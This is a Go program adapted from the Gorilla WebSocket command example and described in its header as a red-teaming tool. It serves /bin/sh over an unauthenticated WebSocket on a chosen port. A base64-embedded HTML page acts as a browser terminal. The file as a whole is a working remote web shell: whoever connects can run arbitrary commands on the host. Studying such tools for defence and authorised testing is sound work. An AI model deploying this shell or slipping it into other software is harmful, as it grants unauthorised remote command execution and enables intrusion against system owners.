// Copyright 2015 The Gorilla WebSocket Authors. All rights reserved.
// Use of this source code is governed by a BSD-style
// license that can be found in the LICENSE file.

// modified 2018 by rossja <algorythm@gmail.com> to
// 1. hard-code /bin/sh as the command to bind to the websocket
// 2. support running the server on a user-specified port
// 3. embed the html content as b64 encoded string rather than using
//    an external file (arguably more useful for red-teaming)

package main

import (
	"bufio"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"time"

	"github.com/gorilla/websocket"
)

var (
	addr    = flag.String("port", ":8080", "http service address")
	cmdPath string
)

const (
	// Time allowed to write a message to the peer.
	writeWait = 10 * time.Second

	// Maximum message size allowed from peer.
	maxMessageSize = 8192

	// Time allowed to read the next pong message from the peer.
	pongWait = 60 * time.Second

	// Send pings to peer with this period. Must be less than pongWait.
	pingPeriod = (pongWait * 9) / 10

	// Time to wait before force close on connection.
	closeGracePeriod = 10 * time.Second
)

func pumpStdin(ws *websocket.Conn, w io.Writer) {
	defer ws.Close()
	ws.SetReadLimit(maxMessageSize)
	ws.SetReadDeadline(time.Now().Add(pongWait))
	ws.SetPongHandler(func(string) error { ws.SetReadDeadline(time.Now().Add(pongWait)); return nil })
	for {
		_, message, err := ws.ReadMessage()
		if err != nil {
			break
		}
		message = append(message, '\n')
		if _, err := w.Write(message); err != nil {
			break
		}
	}
}

func pumpStdout(ws *websocket.Conn, r io.Reader, done chan struct{}) {
	defer func() {
	}()
	s := bufio.NewScanner(r)
	for s.Scan() {
		ws.SetWriteDeadline(time.Now().Add(writeWait))
		if err := ws.WriteMessage(websocket.TextMessage, s.Bytes()); err != nil {
			ws.Close()
			break
		}
	}
	if s.Err() != nil {
		log.Println("scan:", s.Err())
	}
	close(done)

	ws.SetWriteDeadline(time.Now().Add(writeWait))
	ws.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
	time.Sleep(closeGracePeriod)
	ws.Close()
}

func ping(ws *websocket.Conn, done chan struct{}) {
	ticker := time.NewTicker(pingPeriod)
	defer ticker.Stop()
	for {
		select {
		case <-ticker.C:
			if err := ws.WriteControl(websocket.PingMessage, []byte{}, time.Now().Add(writeWait)); err != nil {
				log.Println("ping:", err)
			}
		case <-done:
			return
		}
	}
}

func internalError(ws *websocket.Conn, msg string, err error) {
	log.Println(msg, err)
	ws.WriteMessage(websocket.TextMessage, []byte("Internal server error."))
}

var upgrader = websocket.Upgrader{}

func serveWs(w http.ResponseWriter, r *http.Request) {
	ws, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Println("upgrade:", err)
		return
	}

	defer ws.Close()

	outr, outw, err := os.Pipe()
	if err != nil {
		internalError(ws, "stdout:", err)
		return
	}
	defer outr.Close()
	defer outw.Close()

	inr, inw, err := os.Pipe()
	if err != nil {
		internalError(ws, "stdin:", err)
		return
	}
	defer inr.Close()
	defer inw.Close()

	proc, err := os.StartProcess(cmdPath, flag.Args(), &os.ProcAttr{
		Files: []*os.File{inr, outw, outw},
	})
	if err != nil {
		internalError(ws, "start:", err)
		return
	}

	inr.Close()
	outw.Close()

	stdoutDone := make(chan struct{})
	go pumpStdout(ws, outr, stdoutDone)
	go ping(ws, stdoutDone)

	pumpStdin(ws, inw)

	// Some commands will exit when stdin is closed.
	inw.Close()

	// Other commands need a bonk on the head.
	if err := proc.Signal(os.Interrupt); err != nil {
		log.Println("inter:", err)
	}

	select {
	case <-stdoutDone:
	case <-time.After(time.Second):
		// A bigger bonk on the head.
		if err := proc.Signal(os.Kill); err != nil {
			log.Println("term:", err)
		}
		<-stdoutDone
	}

	if _, err := proc.Wait(); err != nil {
		log.Println("wait:", err)
	}
}

func serveHome(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html")

	// set the base64 encoded html content
	const b64data = "PCFET0NUWVBFIGh0bWw+PGh0bWwgbGFuZz0iZW4iPjxoZWFkPjx0aXRsZT5Db21tYW5kIEV4YW1wbGU8L3RpdGxlPjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij53aW5kb3cub25sb2FkPWZ1bmN0aW9uKCl7dmFyIGUsbj1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibXNnIiksdD1kb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibG9nIik7ZnVuY3Rpb24gbyhlKXt2YXIgbj10LnNjcm9sbFRvcD50LnNjcm9sbEhlaWdodC10LmNsaWVudEhlaWdodC0xO3QuYXBwZW5kQ2hpbGQoZSksbiYmKHQuc2Nyb2xsVG9wPXQuc2Nyb2xsSGVpZ2h0LXQuY2xpZW50SGVpZ2h0KX1pZihkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZm9ybSIpLm9uc3VibWl0PWZ1bmN0aW9uKCl7cmV0dXJuISFlJiYoISFuLnZhbHVlJiYoZS5zZW5kKG4udmFsdWUpLG4udmFsdWU9IiIsITEpKX0sd2luZG93LldlYlNvY2tldCkoZT1uZXcgV2ViU29ja2V0KCJ3czovLyIrZG9jdW1lbnQubG9jYXRpb24uaG9zdCsiL3dzIikpLm9uY2xvc2U9ZnVuY3Rpb24oZSl7dmFyIG49ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7bi5pbm5lckhUTUw9IjxiPkNvbm5lY3Rpb24gY2xvc2VkLjwvYj4iLG8obil9LGUub25tZXNzYWdlPWZ1bmN0aW9uKGUpe2Zvcih2YXIgbj1lLmRhdGEuc3BsaXQoIlxuIiksdD0wO3Q8bi5sZW5ndGg7dCsrKXt2YXIgYz1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTtjLmlubmVyVGV4dD1uW3RdLG8oYyl9fTtlbHNle3ZhciBjPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpO2MuaW5uZXJIVE1MPSI8Yj5Zb3VyIGJyb3dzZXIgZG9lcyBub3Qgc3VwcG9ydCBXZWJTb2NrZXRzLjwvYj4iLG8oYyl9fTs8L3NjcmlwdD48c3R5bGUgdHlwZT0idGV4dC9jc3MiPiNmb3JtLCNsb2d7cG9zaXRpb246YWJzb2x1dGV9I2Zvcm0sYm9keXttYXJnaW46MDt3aWR0aDoxMDAlO292ZXJmbG93OmhpZGRlbn0jZm9ybSxib2R5LGh0bWx7b3ZlcmZsb3c6aGlkZGVufWJvZHl7cGFkZGluZzowO2hlaWdodDoxMDAlO2JhY2tncm91bmQ6Z3JheX0jbG9ne2JhY2tncm91bmQ6I2ZmZjttYXJnaW46MDtwYWRkaW5nOi41ZW07dG9wOi41ZW07bGVmdDouNWVtO3JpZ2h0Oi41ZW07Ym90dG9tOjNlbTtvdmVyZmxvdzphdXRvfSNsb2cgcHJle21hcmdpbjowfSNmb3Jte3BhZGRpbmc6MCAuNWVtO2JvdHRvbToxZW07bGVmdDowfTwvc3R5bGU+PC9oZWFkPjxib2R5PjxkaXYgaWQ9ImxvZyI+PC9kaXY+PGZvcm0gaWQ9ImZvcm0iPjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJTZW5kIiAvPjxpbnB1dCB0eXBlPSJ0ZXh0IiBpZD0ibXNnIiBzaXplPSI2NCIvPjwvZm9ybT48L2JvZHk+PC9odG1sPg=="

	if r.URL.Path != "/" {
		http.Error(w, "Not found", http.StatusNotFound)
		return
	}
	if r.Method != "GET" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	// serve the b64 encoded data
	body, err := base64.StdEncoding.DecodeString(b64data)
	if err != nil {
		fmt.Println("error:", err)
		return
	}
	fmt.Fprintf(w, "%s", body)
}

func main() {
	flag.Parse()
	if len(flag.Args()) < 1 {
		log.Fatal("must specify the port to listen on")
	}
	var err error
	cmdPath, err = exec.LookPath("/bin/sh")
	if err != nil {
		log.Fatal(err)
	}
	http.HandleFunc("/", serveHome)
	http.HandleFunc("/ws", serveWs)
	log.Fatal(http.ListenAndServe(*addr, nil))
}
